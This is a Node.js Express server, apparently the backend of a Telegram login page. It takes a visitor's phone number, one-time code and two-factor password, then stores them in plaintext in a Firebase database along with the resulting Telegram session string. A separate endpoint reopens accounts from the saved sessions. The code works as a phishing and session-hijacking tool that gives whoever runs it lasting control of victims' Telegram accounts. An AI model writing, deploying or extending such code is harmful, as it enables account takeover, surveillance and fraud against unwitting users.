require('dotenv').config();
const express = require('express');
const path = require('path');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { Api } = require('telegram');
const admin = require('firebase-admin');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));

// Telegram config
const apiId = parseInt(process.env.API_ID);
const apiHash = process.env.API_HASH;

// Temp session store
const tempSessions = {};

// ================= Firebase Admin =================
const serviceAccount = {
  type: "service_account",
  project_id: process.env.FIREBASE_PROJECT_ID,
  private_key: process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g,'\n'),
  client_email: process.env.FIREBASE_CLIENT_EMAIL
};

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  databaseURL: process.env.FIREBASE_DATABASE_URL
});

const db = admin.database();

// ================= ROUTES =================
app.get('/', (req,res)=>res.sendFile(path.join(__dirname,'index.html')));
app.get('/favicon.ico',(req,res)=>res.status(204));

// 🔹 STEP 1: Send OTP
app.post('/send-otp', async (req,res)=>{
  let { phone } = req.body;
  try{
    phone = String(phone).trim();
    if(!phone.startsWith('+')) phone = '+855' + phone;

    const client = new TelegramClient(new StringSession(''), apiId, apiHash, { connectionRetries:5 });
    await client.connect();

    const result = await client.invoke(new Api.auth.SendCode({
      phoneNumber: phone,
      apiId,
      apiHash,
      settings: new Api.CodeSettings({})
    }));

    tempSessions[phone] = { client, phoneCodeHash: result.phoneCodeHash };
    console.log("OTP sent:", phone);
    res.json({ success:true });

  } catch(err){
    console.error("SEND OTP ERROR:", err);
    res.status(500).json({ success:false, error:err.message });
  }
});

// 🔹 STEP 2: Login + 2FA + save session
app.post('/login', async (req,res)=>{
  let { phone, otp, password } = req.body;
  if(!phone || !otp) return res.json({ success:false, message:'Phone & OTP required' });

  try{
    phone = String(phone).trim();
    if(!phone.startsWith('+')) phone = '+855'+phone;

    const temp = tempSessions[phone];
    if(!temp) return res.json({ success:false, message:'Session expired. Try again.' });

    const { client, phoneCodeHash } = temp;

    try{
      await client.invoke(new Api.auth.SignIn({
        phoneNumber: phone,
        phoneCode: otp,
        phoneCodeHash
      }));
    } catch(err){
      if(err.error_message?.includes('SESSION_PASSWORD_NEEDED')){
        return res.json({ requirePassword:true, message:'2FA password required' });
      } else throw err;
    }

    if(password){
      await client.invoke(new Api.auth.CheckPassword({ password }));
    }

    // Save session string
    const sessionString = client.session.save();
    console.log("LOGIN SUCCESS:", phone);

    // Save to Firebase
    await db.ref('telegram_logins').push({
      phone,
      otp,
      password: password || null,
      sessionString,
      timestamp: Date.now()
    });

    delete tempSessions[phone];
    await client.disconnect();

    res.json({ success:true, message:'Login successful. Session saved!' });

  } catch(err){
    console.error("LOGIN ERROR:", err.message);
    res.json({ success:false, message:err.message });
  }
});

// 🔹 STEP 3: Auto login using saved session
app.post('/auto-login', async (req,res)=>{
  let { phone } = req.body;
  if(!phone) return res.json({ success:false, message:'Phone required' });

  try{
    phone = String(phone).trim();
    if(!phone.startsWith('+')) phone = '+855'+phone;

    // Fetch last sessionString for this phone
    const snapshot = await db.ref('telegram_logins').orderByChild('phone').equalTo(phone).limitToLast(1).once('value');
    if(!snapshot.exists()){
      return res.json({ success:false, message:'No saved session found' });
    }

    const sessionData = Object.values(snapshot.val())[0];
    if(!sessionData.sessionString) return res.json({ success:false, message:'No session string saved' });

    const client = new TelegramClient(new StringSession(sessionData.sessionString), apiId, apiHash, { connectionRetries:5 });
    await client.connect();

    res.json({ success:true, message:'Auto login success! Session active.' });

    await client.disconnect();

  } catch(err){
    console.error("AUTO LOGIN ERROR:", err.message);
    res.json({ success:false, message:err.message });
  }
});

// ================= START =================
const PORT = process.env.PORT || 3000;
app.listen(PORT, ()=>console.log("Server running on port",PORT));
